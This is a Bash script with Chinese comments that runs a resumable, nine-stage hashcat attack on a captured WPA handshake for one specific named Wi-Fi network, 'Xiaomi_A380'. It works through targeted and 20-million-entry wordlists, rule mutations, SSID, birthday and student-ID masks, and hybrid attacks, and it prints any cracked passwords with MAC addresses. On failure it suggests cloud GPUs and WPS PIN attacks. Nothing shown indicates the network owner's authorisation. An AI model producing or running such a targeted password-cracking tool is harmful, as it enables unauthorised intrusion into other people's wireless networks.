#!/bin/bash
# ============================================================================
# Xiaomi_A380 断电安全破解脚本 (带断点续传)
# ============================================================================
# 断电保护机制:
#   1. hashcat --session 保存运行状态 → 断电后 --restore 续传
#   2. .checkpoint 文件记录已完成阶段 → 跳过已跑过的攻击
#   3. potfile 记录已破解密码 → 自动跳过已破解的 hash
#   使用: bash crack_xiaomi_a380_resume.sh
# 断电后重新运行同一命令即可从断点继续
# ============================================================================

set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
DICT_DIR="${SCRIPT_DIR}/dicts"
WORK_DIR="${SCRIPT_DIR}/work/xiaomi_a380"
# 支持: bash crack_xiaomi_a380_resume.sh [hash文件]
HASH_FILE="${1:-${SCRIPT_DIR}/captures/combined.hc22000}"
# session 文件放到 work 下，避免绑定 Homebrew Cellar 版本路径
export HASHCAT_SESSION_PATH="${HASHCAT_SESSION_PATH:-${WORK_DIR}/sessions}"

mkdir -p "${WORK_DIR}" "${HASHCAT_SESSION_PATH}"

# ── 固定 session 名（断电后 --restore 用同一个名字恢复）──
SESSION_NAME="xiaomi_a380_crack"
POTFILE="${WORK_DIR}/xiaomi_a380.potfile"
CHECKPOINT="${WORK_DIR}/.checkpoint"
RESULT_FILE="${WORK_DIR}/result_xiaomi_a380.txt"
OUTFILE="${WORK_DIR}/xiaomi_a380_cracked.txt"
LOG_FILE="${WORK_DIR}/crack_log.txt"
BIG_DICT="${SCRIPT_DIR}/dicts/china-wifi-ultra.txt"

HASHCAT=$(which hashcat)
[ -z "${HASHCAT}" ] && { echo "[!] hashcat 未安装: brew install hashcat"; exit 1; }

log() {
    echo "[$(date '+%H:%M:%S')] $*" | tee -a "${LOG_FILE}"
}

# ── 断点检查：是否已全部破解 ──
check_if_cracked() {
    [ -f "${POTFILE}" ] || return 1
    local pot_cnt hash_cnt
    pot_cnt=$(wc -l < "${POTFILE}" | tr -d ' ')
    hash_cnt=$(grep -c "^WPA\*" "${HASH_FILE}" 2>/dev/null || echo 1)
    if [ "${pot_cnt}" -ge "${hash_cnt}" ]; then
        log "★★★ 已破解 ${pot_cnt}/${hash_cnt}，全部完成 ★★★"
        return 0
    fi
    return 1
}

# ── 显示已破解结果 ──
show_cracked() {
    [ -f "${POTFILE}" ] || return
    local cnt
    cnt=$(wc -l < "${POTFILE}" | tr -d ' ')
    [ "${cnt}" -eq 0 ] && return
    log "★ 已破解 ${cnt} 条 ★"
    ${HASHCAT} -m 22000 "${HASH_FILE}" --potfile-path "${POTFILE}" --show 2>/dev/null | \
    while IFS=: read -r hash pw; do
        local ssid_hex ssid bssid mac
        ssid_hex=$(echo "$hash" | cut -d'*' -f6)
        ssid=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
        bssid=$(echo "$hash" | cut -d'*' -f4)
        mac=$(echo "$bssid" | sed 's/\(..\)/\1:/g; s/:$//')
        log "  -> ${ssid}: ${pw} (MAC: ${mac})"
        printf "WiFi: %s\n密码: %s\nMAC:  %s\n\n" "${ssid}" "${pw}" "${mac}" >> "${RESULT_FILE}"
    done
}

# ── 运行单轮 hashcat 攻击 ──
# 参数: $1=轮次名, 剩余参数=hashcat 参数
run_round() {
    local round_name="$1"; shift
    if check_if_cracked; then return 0; fi
    log "  [${round_name}] 开始..."
    ${HASHCAT} -m 22000 \
        --session "${SESSION_NAME}" \
        --potfile-path "${POTFILE}" \
        -o "${OUTFILE}" --outfile-format 2 \
        -w 3 --status --status-timer 30 \
        --hwmon-temp-abort=95 \
        "$@" 2>&1 | tee -a "${LOG_FILE}"
    show_cracked
}

# ── 检查是否有未完成的 session 可以恢复 ──
try_restore_session() {
    local restore_file="${HASHCAT_SESSION_PATH}/${SESSION_NAME}.restore"
    if [ -f "${restore_file}" ]; then
        log ">>> 发现未完成 session: ${restore_file}"
        log ">>> 执行 hashcat --restore ..."
        ${HASHCAT} --session "${SESSION_NAME}" --restore 2>&1 | tee -a "${LOG_FILE}" || true
        show_cracked
        if check_if_cracked; then
            log "恢复后已全部破解，退出"
            exit 0
        fi
        return 0
    fi
    return 1
}

# ============================================================================
# 主程序
# ============================================================================
: > "${LOG_FILE}"
log "============================================"
log "  Xiaomi_A380 断电安全破解"
log "  Hash: ${HASH_FILE}"
log "  字典: china-wifi-ultra ($(wc -l < "${BIG_DICT}" 2>/dev/null || echo 0) 条)"
log "  Session: ${HASHCAT_SESSION_PATH}/${SESSION_NAME}"
log "============================================"

if [ ! -f "${HASH_FILE}" ]; then
    log "[!] 找不到 hash 文件: ${HASH_FILE}"
    log "    用法: bash crack_xiaomi_a380_resume.sh [path/to.hc22000]"
    exit 1
fi
if [ ! -f "${BIG_DICT}" ]; then
    log "[!] 找不到超大字典: ${BIG_DICT}"; exit 1
fi

# 如果已经破解过，直接显示结果
if check_if_cracked; then
    show_cracked
    exit 0
fi

# 尝试恢复未完成 session
try_restore_session || true

# 查找规则文件
RULE_BEST64=""
for rp in $(find /opt/homebrew /usr/local /usr/share -path '*/hashcat/rules/best64.rule' 2>/dev/null); do
    [ -f "$rp" ] && RULE_BEST64="$rp" && break
done
RULE_CHINA="${DICT_DIR}/china-wifi.rule"
DICT_TARGETED="${WORK_DIR}/xiaomi_a380_targeted.txt"

log "规则: best64=${RULE_BEST64:-(未找到)} china-wifi=${RULE_CHINA}"

# ─────────────────────────────────────────────────────
# 阶段 1: 超强定向字典 (19万条，快速)
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 1 ]; then
    log ">>>>>> 阶段 1/9: 超强定向字典 (19万条) <<<<<<"
    if [ ! -f "${DICT_TARGETED}" ]; then
        log "  生成定向字典..."
        cd "${SCRIPT_DIR}" && python3 gen_xiaomi_a380.py >> "${LOG_FILE}" 2>&1
    fi
    run_round "定向字典" -a 0 "${DICT_TARGETED}"
    echo 1 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 2: 定向字典 × 规则 (最快规则变形)
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 2 ]; then
    log ">>>>>> 阶段 2/9: 定向字典 × 规则 <<<<<<"
    [ -n "${RULE_BEST64}" ] && run_round "定向×best64" -a 0 "${DICT_TARGETED}" -r "${RULE_BEST64}"
    [ -f "${RULE_CHINA}" ] && run_round "定向×china-wifi" -a 0 "${DICT_TARGETED}" -r "${RULE_CHINA}"
    echo 2 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 3: 中国超大字典 纯字典 (2010万条，~7分钟)
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 3 ]; then
    log ">>>>>> 阶段 3/9: 中国超大字典 纯攻击 (2010万条) <<<<<<"
    run_round "中国字典2010万" -a 0 "${BIG_DICT}"
    echo 3 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 4: 中国超大字典 × 规则
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 4 ]; then
    log ">>>>>> 阶段 4/9: 中国超大字典 × 规则 <<<<<<"
    [ -n "${RULE_BEST64}" ] && run_round "大字典×best64" -a 0 "${BIG_DICT}" -r "${RULE_BEST64}"
    [ -f "${RULE_CHINA}" ] && run_round "大字典×china-wifi" -a 0 "${BIG_DICT}" -r "${RULE_CHINA}"
    echo 4 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 5: SSID 定向掩码 (快速)
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 5 ]; then
    log ">>>>>> 阶段 5/9: SSID 定向掩码 <<<<<<"
    run_round "SSID+4数字" -a 3 'Xiaomi_A380?d?d?d?d'
    run_round "ssid+4数字" -a 3 'xiaomi_a380?d?d?d?d'
    run_round "a380+4数字" -a 3 'a380?d?d?d?d'
    run_round "A380+4数字" -a 3 'A380?d?d?d?d'
    run_round "SSID+6数字" -a 3 'Xiaomi_A380?d?d?d?d?d?d'
    run_round "a380+6数字" -a 3 'a380?d?d?d?d?d?d'
    echo 5 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 6: 纯数字 + 生日 掩码 (8-11位纯数字最快)
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 6 ]; then
    log ">>>>>> 阶段 6/9: 纯数字 + 生日 掩码 <<<<<<"
    run_round "8位纯数字" -a 3 '?d?d?d?d?d?d?d?d'
    run_round "11位纯数字" -a 3 '?d?d?d?d?d?d?d?d?d?d?d'
    run_round "19YYMMDD" -a 3 '19?d?d?d?d?d?d?d'
    run_round "20YYMMDD" -a 3 '20?d?d?d?d?d?d?d'
    run_round "19YYMMDDXX" -a 3 '19?d?d?d?d?d?d?d?d'
    run_round "20YYMMDDXX" -a 3 '20?d?d?d?d?d?d?d?d'
    echo 6 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 7: 学号 + 手机号 掩码
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 7 ]; then
    log ">>>>>> 阶段 7/9: 学号 + 手机号 掩码 <<<<<<"
    for yr in 2019 2020 2021 2022 2023 2024 2025; do
        run_round "学号 ${yr}" -a 3 "${yr}?d?d?d?d?d?d"
    done
    echo 7 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 8: Hybrid 混合攻击
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 8 ]; then
    log ">>>>>> 阶段 8/9: 混合攻击 <<<<<<"
    for mask in '.' '@' '!'; do
        run_round "定向+${mask}" -a 6 "${DICT_TARGETED}" "${mask}"
    done
    run_round "定向+2数字" -a 6 "${DICT_TARGETED}" '?d?d'
    echo 8 > "${CHECKPOINT}"
fi

# ─────────────────────────────────────────────────────
# 阶段 9: 综合掩码文件
# ─────────────────────────────────────────────────────
if [ "$(cat "${CHECKPOINT}" 2>/dev/null || echo 0)" -lt 9 ]; then
    log ">>>>>> 阶段 9/9: 综合掩码文件 <<<<<<"
    [ -f "${DICT_DIR}/campus-strong-masks.hcmask" ] && \
        run_round "campus掩码" -a 3 "${DICT_DIR}/campus-strong-masks.hcmask"
    [ -f "${DICT_DIR}/00-china-wifi-masks.hcmask" ] && \
        run_round "china-wifi掩码" -a 3 "${DICT_DIR}/00-china-wifi-masks.hcmask"
    echo 9 > "${CHECKPOINT}"
fi

# ============================================================================
# 最终结果
# ============================================================================
log ""
log "============================================"
log "  全部攻击阶段完成"
log "============================================"

if check_if_cracked; then
    log ""
    log "╔════════════════════════════════════════╗"
    log "║          ★ 破解成功 ★                 ║"
    log "╠════════════════════════════════════════╣"
    ${HASHCAT} -m 22000 "${HASH_FILE}" --potfile-path "${POTFILE}" --show 2>/dev/null | \
    while IFS=: read -r hash pw; do
        _ssid_hex=$(echo "$hash" | cut -d'*' -f6)
        _ssid=$(echo "$_ssid_hex" | xxd -r -p 2>/dev/null || echo "$_ssid_hex")
        _bssid=$(echo "$hash" | cut -d'*' -f4)
        _mac=$(echo "$_bssid" | sed 's/\(..\)/\1:/g; s/:$//')
        log "║  WiFi: ${_ssid}"
        log "║  密码: ${pw}"
        log "║  MAC:  ${_mac}"
    done
    log "╚════════════════════════════════════════╝"
    log "结果文件: ${RESULT_FILE}"
else
    log ""
    log "  全部 9 阶段攻击完毕，未破解"
    log "  下一步建议:"
    log "    1. 检查握手包质量 (重新抓包)"
    log "    2. 使用 AutoDL 云 GPU (更大算力)"
    log "    3. WPS PIN 物理层攻击"
fi

# 清理临时文件
rm -f "${WORK_DIR}"/f_*.txt "${WORK_DIR}"/hd_*.txt "${WORK_DIR}"/hybrid_*.txt 2>/dev/null
log "日志: ${LOG_FILE}"
